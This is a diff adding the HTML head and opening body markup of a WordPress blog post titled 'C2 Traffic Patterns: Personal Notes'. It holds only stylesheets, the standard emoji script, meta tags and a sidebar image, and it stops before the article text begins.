@@ -1,0 +1,1314 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="profile" href="http://gmpg.org/xfn/11">
+<link rel="pingback" href="https://marcoramilli.com/xmlrpc.php">
+
+<title>C2 Traffic Patterns: Personal Notes</title>
+<meta name='robots' content='max-image-preview:large' />
+<!-- Jetpack Site Verification Tags -->
+<link rel='dns-prefetch' href='//js.stripe.com' />
+<link rel='dns-prefetch' href='//stats.wp.com' />
+<link rel='dns-prefetch' href='//i0.wp.com' />
+<link rel='dns-prefetch' href='//widgets.wp.com' />
+<link rel='dns-prefetch' href='//s0.wp.com' />
+<link rel='dns-prefetch' href='//0.gravatar.com' />
+<link rel='dns-prefetch' href='//1.gravatar.com' />
+<link rel='dns-prefetch' href='//2.gravatar.com' />
+<link rel='dns-prefetch' href='//c0.wp.com' />
+<link rel='dns-prefetch' href='//v0.wordpress.com' />
+<link rel="alternate" type="application/rss+xml" title="Marco Ramilli Web Corner &raquo; Feed" href="https://marcoramilli.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Marco Ramilli Web Corner &raquo; Comments Feed" href="https://marcoramilli.com/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Marco Ramilli Web Corner &raquo; C2 Traffic Patterns: Personal Notes Comments Feed" href="https://marcoramilli.com/2021/01/09/c2-traffic-patterns-personal-notes/feed/" />
+<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/marcoramilli.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.4.2"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udfff","\ud83e\udef1\ud83c\udffb\u200b\ud83e\udef2\ud83c\udfff")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+		<style id="content-control-block-styles">
+			@media (max-width: 640px) {
+	.cc-hide-on-mobile {
+		display: none !important;
+	}
+}
+@media (min-width: 641px) and (max-width: 920px) {
+	.cc-hide-on-tablet {
+		display: none !important;
+	}
+}
+@media (min-width: 921px) and (max-width: 1440px) {
+	.cc-hide-on-desktop {
+		display: none !important;
+	}
+}		</style>
+		<link rel='stylesheet' id='all-css-dd2dd1de07effe0212ff398ed4c55cbe' href='https://marcoramilli.com/_jb_static/??-eJydUkluwzAM/E1PVVQ3RXsKegnQB/QBhSwRNmNaFEQZiX9f2VnguHAS9MaRZkZDivugLPsEPulAXYVe9A5SMLbRLbuOQHQEMgmcCixphlZW5Hn/16LqMiwhVrrskJwuiW2jCMtoYq8l9QRLUjI9d0lVEd01Eb2lzuU8O9EtODRA0A7KKQhZDlERVMb2qxb9XXW+m+KpZh7N8tiHaIeSjuHU+UwV/1LBIXMF2S+O8qbceGxNyvJl9YjH88g0NTn+SW49cXz0Hy23gX1myO1PvIS+jH0LAbwDbzGDL94a53r9PXjIyXtYK0lLjvOlJGzgTggC0/QqmH5viLTOLI0iHbTq6mYuT3VeBNEQccF/QlC2HqIv7mmq0TYlHy7Fo+1JbSK4cUhDib66p/zJ72phi4YUccVyBW6t9dlhGNCpHqif7ab4eFm/F2/F+vXJlpviF4pjmS8=' type='text/css' media='all' />
+<style id='wp-block-library-inline-css'>
+.has-text-align-justify{text-align:justify;}
+</style>
+<style id='wp-emoji-styles-inline-css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<style id='classic-theme-styles-inline-css'>
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id='global-styles-inline-css'>
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 15px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 24px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-size--regular: 18px;--wp--preset--font-size--larger: 32px;--wp--preset--font-size--huge: 40px;--wp--preset--font-family--albert-sans: 'Albert Sans', sans-serif;--wp--preset--font-family--alegreya: Alegreya, serif;--wp--preset--font-family--arvo: Arvo, serif;--wp--preset--font-family--bodoni-moda: 'Bodoni Moda', serif;--wp--preset--font-family--cabin: Cabin, sans-serif;--wp--preset--font-family--chivo: Chivo, sans-serif;--wp--preset--font-family--commissioner: Commissioner, sans-serif;--wp--preset--font-family--cormorant: Cormorant, serif;--wp--preset--font-family--courier-prime: 'Courier Prime', monospace;--wp--preset--font-family--crimson-pro: 'Crimson Pro', serif;--wp--preset--font-family--dm-mono: 'DM Mono', monospace;--wp--preset--font-family--dm-sans: 'DM Sans', sans-serif;--wp--preset--font-family--domine: Domine, serif;--wp--preset--font-family--eb-garamond: 'EB Garamond', serif;--wp--preset--font-family--epilogue: Epilogue, sans-serif;--wp--preset--font-family--figtree: Figtree, sans-serif;--wp--preset--font-family--fira-sans: 'Fira Sans', sans-serif;--wp--preset--font-family--fraunces: Fraunces, serif;--wp--preset--font-family--ibm-plex-mono: 'IBM Plex Mono', monospace;--wp--preset--font-family--ibm-plex-sans: 'IBM Plex Sans', sans-serif;--wp--preset--font-family--inter: Inter, sans-serif;--wp--preset--font-family--josefin-sans: 'Josefin Sans', sans-serif;--wp--preset--font-family--jost: Jost, sans-serif;--wp--preset--font-family--libre-baskerville: 'Libre Baskerville', serif;--wp--preset--font-family--libre-franklin: 'Libre Franklin', sans-serif;--wp--preset--font-family--literata: Literata, serif;--wp--preset--font-family--lora: Lora, serif;--wp--preset--font-family--merriweather: Merriweather, serif;--wp--preset--font-family--montserrat: Montserrat, sans-serif;--wp--preset--font-family--newsreader: Newsreader, serif;--wp--preset--font-family--nunito: Nunito, sans-serif;--wp--preset--font-family--open-sans: 'Open Sans', sans-serif;--wp--preset--font-family--overpass: Overpass, sans-serif;--wp--preset--font-family--petrona: Petrona, serif;--wp--preset--font-family--piazzolla: Piazzolla, serif;--wp--preset--font-family--playfair-display: 'Playfair Display', serif;--wp--preset--font-family--plus-jakarta-sans: 'Plus Jakarta Sans', sans-serif;--wp--preset--font-family--poppins: Poppins, sans-serif;--wp--preset--font-family--raleway: Raleway, sans-serif;--wp--preset--font-family--roboto: Roboto, sans-serif;--wp--preset--font-family--roboto-slab: 'Roboto Slab', serif;--wp--preset--font-family--rubik: Rubik, sans-serif;--wp--preset--font-family--sora: Sora, sans-serif;--wp--preset--font-family--source-sans-3: 'Source Sans 3', sans-serif;--wp--preset--font-family--source-serif-4: 'Source Serif 4', serif;--wp--preset--font-family--space-mono: 'Space Mono', monospace;--wp--preset--font-family--texturina: Texturina, serif;--wp--preset--font-family--work-sans: 'Work Sans', sans-serif;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}.has-albert-sans-font-family{font-family: var(--wp--preset--font-family--albert-sans) !important;}.has-alegreya-font-family{font-family: var(--wp--preset--font-family--alegreya) !important;}.has-arvo-font-family{font-family: var(--wp--preset--font-family--arvo) !important;}.has-bodoni-moda-font-family{font-family: var(--wp--preset--font-family--bodoni-moda) !important;}.has-cabin-font-family{font-family: var(--wp--preset--font-family--cabin) !important;}.has-chivo-font-family{font-family: var(--wp--preset--font-family--chivo) !important;}.has-commissioner-font-family{font-family: var(--wp--preset--font-family--commissioner) !important;}.has-cormorant-font-family{font-family: var(--wp--preset--font-family--cormorant) !important;}.has-courier-prime-font-family{font-family: var(--wp--preset--font-family--courier-prime) !important;}.has-crimson-pro-font-family{font-family: var(--wp--preset--font-family--crimson-pro) !important;}.has-dm-mono-font-family{font-family: var(--wp--preset--font-family--dm-mono) !important;}.has-dm-sans-font-family{font-family: var(--wp--preset--font-family--dm-sans) !important;}.has-domine-font-family{font-family: var(--wp--preset--font-family--domine) !important;}.has-eb-garamond-font-family{font-family: var(--wp--preset--font-family--eb-garamond) !important;}.has-epilogue-font-family{font-family: var(--wp--preset--font-family--epilogue) !important;}.has-figtree-font-family{font-family: var(--wp--preset--font-family--figtree) !important;}.has-fira-sans-font-family{font-family: var(--wp--preset--font-family--fira-sans) !important;}.has-fraunces-font-family{font-family: var(--wp--preset--font-family--fraunces) !important;}.has-ibm-plex-mono-font-family{font-family: var(--wp--preset--font-family--ibm-plex-mono) !important;}.has-ibm-plex-sans-font-family{font-family: var(--wp--preset--font-family--ibm-plex-sans) !important;}.has-inter-font-family{font-family: var(--wp--preset--font-family--inter) !important;}.has-josefin-sans-font-family{font-family: var(--wp--preset--font-family--josefin-sans) !important;}.has-jost-font-family{font-family: var(--wp--preset--font-family--jost) !important;}.has-libre-baskerville-font-family{font-family: var(--wp--preset--font-family--libre-baskerville) !important;}.has-libre-franklin-font-family{font-family: var(--wp--preset--font-family--libre-franklin) !important;}.has-literata-font-family{font-family: var(--wp--preset--font-family--literata) !important;}.has-lora-font-family{font-family: var(--wp--preset--font-family--lora) !important;}.has-merriweather-font-family{font-family: var(--wp--preset--font-family--merriweather) !important;}.has-montserrat-font-family{font-family: var(--wp--preset--font-family--montserrat) !important;}.has-newsreader-font-family{font-family: var(--wp--preset--font-family--newsreader) !important;}.has-nunito-font-family{font-family: var(--wp--preset--font-family--nunito) !important;}.has-open-sans-font-family{font-family: var(--wp--preset--font-family--open-sans) !important;}.has-overpass-font-family{font-family: var(--wp--preset--font-family--overpass) !important;}.has-petrona-font-family{font-family: var(--wp--preset--font-family--petrona) !important;}.has-piazzolla-font-family{font-family: var(--wp--preset--font-family--piazzolla) !important;}.has-playfair-display-font-family{font-family: var(--wp--preset--font-family--playfair-display) !important;}.has-plus-jakarta-sans-font-family{font-family: var(--wp--preset--font-family--plus-jakarta-sans) !important;}.has-poppins-font-family{font-family: var(--wp--preset--font-family--poppins) !important;}.has-raleway-font-family{font-family: var(--wp--preset--font-family--raleway) !important;}.has-roboto-font-family{font-family: var(--wp--preset--font-family--roboto) !important;}.has-roboto-slab-font-family{font-family: var(--wp--preset--font-family--roboto-slab) !important;}.has-rubik-font-family{font-family: var(--wp--preset--font-family--rubik) !important;}.has-sora-font-family{font-family: var(--wp--preset--font-family--sora) !important;}.has-source-sans-3-font-family{font-family: var(--wp--preset--font-family--source-sans-3) !important;}.has-source-serif-4-font-family{font-family: var(--wp--preset--font-family--source-serif-4) !important;}.has-space-mono-font-family{font-family: var(--wp--preset--font-family--space-mono) !important;}.has-texturina-font-family{font-family: var(--wp--preset--font-family--texturina) !important;}.has-work-sans-font-family{font-family: var(--wp--preset--font-family--work-sans) !important;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
+.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+</style>
+<link rel='stylesheet' id='dashicons-css' href='https://marcoramilli.com/wp-includes/css/dashicons.min.css?ver=6.4.2' media='all' />
+<link rel='stylesheet' id='eris-fonts-css' href='https://marcoramilli.com/wp-content/themes/eris-child/assets/fonts/Sk-Modernist/stylesheet.css?ver=1.0.0.1559223638' media='all' />
+<script type="text/javascript" id="jetpack_related-posts-js-extra">
+/* <![CDATA[ */
+var related_posts_js_options = {"post_heading":"h4"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://marcoramilli.com/_jb_static/??wp-content/plugins/jetpack/_inc/build/related-posts/related-posts.min.js,wp-content/plugins/gutenberg/build/modules/importmap-polyfill.min.js?m=1703614132&#038;cb=1'></script>
+<script type="text/javascript" src="https://marcoramilli.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type='text/javascript' src='https://marcoramilli.com/wp-includes/js/jquery/jquery-migrate.min.js?m=1686289764'></script>
+<script type="text/javascript" src="https://js.stripe.com/v3/?ver=4.20.8" id="stripe-js"></script>
+<link rel="https://api.w.org/" href="https://marcoramilli.com/wp-json/" /><link rel="alternate" type="application/json" href="https://marcoramilli.com/wp-json/wp/v2/posts/9394" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://marcoramilli.com/xmlrpc.php?rsd" />
+
+<link rel="canonical" href="https://marcoramilli.com/2021/01/09/c2-traffic-patterns-personal-notes/" />
+<link rel='shortlink' href='https://wp.me/pawnvU-2rw' />
+		<!-- Custom Logo: hide header text -->
+		<style id="custom-logo-css" type="text/css">
+			.site-title, .site-description {
+				position: absolute;
+				clip: rect(1px, 1px, 1px, 1px);
+			}
+		</style>
+		<link rel="alternate" type="application/json+oembed" href="https://marcoramilli.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmarcoramilli.com%2F2021%2F01%2F09%2Fc2-traffic-patterns-personal-notes%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://marcoramilli.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmarcoramilli.com%2F2021%2F01%2F09%2Fc2-traffic-patterns-personal-notes%2F&#038;format=xml" />
+	<style>img#wpstats{display:none}</style>
+		<meta name="description" content="Detection is a key point in threat hunting. During the past few weeks, stright in the middle of the winter &quot;holidays&quot; (well, maybe if you live in a place where no COVID-19 lockdown was involved), many people re/started a studying program on cybersecurity. Some of them wrote to me asking if there is a way&hellip;" />
+<link rel="amphtml" href="https://marcoramilli.com/2021/01/09/c2-traffic-patterns-personal-notes/amp/">
+<!-- Jetpack Open Graph Tags -->
+<meta property="og:type" content="article" />
+<meta property="og:title" content="C2 Traffic Patterns: Personal Notes" />
+<meta property="og:url" content="https://marcoramilli.com/2021/01/09/c2-traffic-patterns-personal-notes/" />
+<meta property="og:description" content="Detection is a key point in threat hunting. During the past few weeks, stright in the middle of the winter &#8220;holidays&#8221; (well, maybe if you live in a place where no COVID-19 lockdown was …" />
+<meta property="article:published_time" content="2021-01-09T07:32:50+00:00" />
+<meta property="article:modified_time" content="2021-12-24T07:20:40+00:00" />
+<meta property="og:site_name" content="Marco Ramilli Web Corner" />
+<meta property="og:image" content="https://s0.wp.com/i/blank.jpg" />
+<meta property="og:image:alt" content="" />
+<meta property="og:locale" content="en_US" />
+<meta name="twitter:text:title" content="C2 Traffic Patterns: Personal Notes" />
+<meta name="twitter:image" content="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/02/cropped-Screen-Shot-2019-02-17-at-13.22.11.png?fit=52%2C52&amp;ssl=1" />
+<meta name="twitter:card" content="summary" />
+
+<!-- End Jetpack Open Graph Tags -->
+<link rel="icon" href="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/02/cropped-Screen-Shot-2019-02-17-at-13.22.11.png?fit=32%2C32&#038;ssl=1" sizes="32x32" />
+<link rel="icon" href="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/02/cropped-Screen-Shot-2019-02-17-at-13.22.11.png?fit=52%2C52&#038;ssl=1" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/02/cropped-Screen-Shot-2019-02-17-at-13.22.11.png?fit=52%2C52&#038;ssl=1" />
+<meta name="msapplication-TileImage" content="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/02/cropped-Screen-Shot-2019-02-17-at-13.22.11.png?fit=52%2C52&#038;ssl=1" />
+<link rel="stylesheet" type="text/css" id="wp-custom-css" href="https://marcoramilli.com/?custom-css=56d4b25600" /></head>
+
+<body class="post-template-default single single-post postid-9394 single-format-standard wp-custom-logo wp-embed-responsive standard-menu sticky-header tk-theme-frontend">
+
+
+<aside id="secondary" class="widget-area" role="complementary">
+	<div class="scroll-box">
+		<section id="media_image-2" class="widget widget_media_image"><style>.widget.widget_media_image { overflow: hidden; }.widget.widget_media_image img { height: auto; max-width: 100%; }</style><img width="600" height="600" src="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/01/dmpu1ofwaaa77eb.jpg?fit=600%2C600&amp;ssl=1" class="image wp-image-2063  attachment-full size-full" alt="" style="max-width: 100%; height: auto;" decoding="async" fetchpriority="high" data-attachment-id="2063" data-permalink="https://marcoramilli.com/dmpu1ofwaaa77eb/" data-orig-file="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/01/dmpu1ofwaaa77eb.jpg?fit=600%2C600&amp;ssl=1" data-orig-size="600,600" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dmpu1ofwaaa77eb" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/01/dmpu1ofwaaa77eb.jpg?fit=300%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/marcoramilli.com/wp-content/uploads/2019/01/dmpu1ofwaaa77eb.jpg?fit=600%2C600&amp;ssl=1" /></section>	</div>
+	<button id="closeSidebar" class="close-sidebar"><span class="screen-reader-text">close sidebar</span></button>
+</aside><!-- #secondary -->
+
+<div id="page" class="site">
+	<a class="skip-link screen-reader-text" href="#main">Skip to content</a>
+
+	<header id="masthead" class="site-header" role="banner">
+		<div class="container container-big">
+
+			<div class="site-branding">
+
+				<!-- Display website logo -->
